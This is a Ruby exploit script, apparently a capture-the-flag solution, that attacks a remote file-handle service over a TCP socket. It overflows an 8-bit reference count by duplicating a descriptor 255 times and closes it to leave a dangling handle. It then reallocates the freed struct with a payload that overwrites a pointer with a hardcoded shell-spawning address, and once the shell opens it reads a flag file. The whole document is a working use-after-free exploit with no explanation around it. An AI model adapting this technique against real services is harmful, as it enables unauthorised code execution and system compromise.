#!/usr/bin/env ruby
# encoding: ascii-8bit

require 'expect'
require 'socket'
require 'pty'
require 'io/console'
require 'colorize'


def log data
    $stdout.puts data.inspect.black.on_white
end

def logerror e
    $stdout.puts e.inspect.black.on_red
end


module IOExtension
    def interact
        begin
            until self.closed? do
                readable, _, _, _ = IO.select([self, $stdin])
                readable.each do |source|
                    case source
                    when self
                        input = self.readchar
                        $stdout.print input.cyan
                    when $stdin
                        self.print $stdin.gets
                    else
                        raise StandardError
                    end
                end
            end
        rescue EOFError => e
            logerror e
            self.close
            return
        rescue Interrupt
            return
        end
    end
end

class IO
    prepend IOExtension
end

host = ARGV[0]
port = ARGV[1]
$s = TCPSocket.new host, port



def list
    command = "list"
    puts command
    $s.puts command
    print $s.expect("\n> ")[0]
end

def create name
    command = "create #{name}"
    puts command
    $s.puts command
    print $s.expect("\n> ")[0]
end

def close fd
    command = "close #{fd}"
    puts command
    $s.puts command
    #print $s.expect("\n> ")[0]
end

def fdup fd
    command = "dup #{fd}"
    puts command
    $s.puts command
    print $s.expect("\n> ")[0]
end

def read fd, n
    command = "read #{fd} #{n}"
    puts command
    $s.puts command
    print answer = $s.expect("\n> ")[0]
end

def write fd, n, string
    command = "write #{fd} #{n} #{string}"
    puts command
    $s.puts command
    print answer = $s.expect("\n> ")[0]
end

def exit
    command = "quit"
    puts command
    $s.puts command
end


print $s.expect("\n> ")[0]

15.times do |i|
    create "myfile#{i}"
end
fdup 0

# overflow refcount of fd 0 and fd 15 to 1
(2**8-1).times do
    fdup 0
end

# close fd 0 -> refcount=0 -> free
close 0

# remaining handle to freed struct in fd 15
read 15, 20

# trigger realloc with write to fd 1 (struct malloc size is 88 bytest)
SPAWN_SHELL = 0x400e9e
write 1, 75, 'A' * 48 + [SPAWN_SHELL].pack('Q')

# spawn shell
close 15






sleep 1
$s.puts "cat flag.txt"

$s.interact
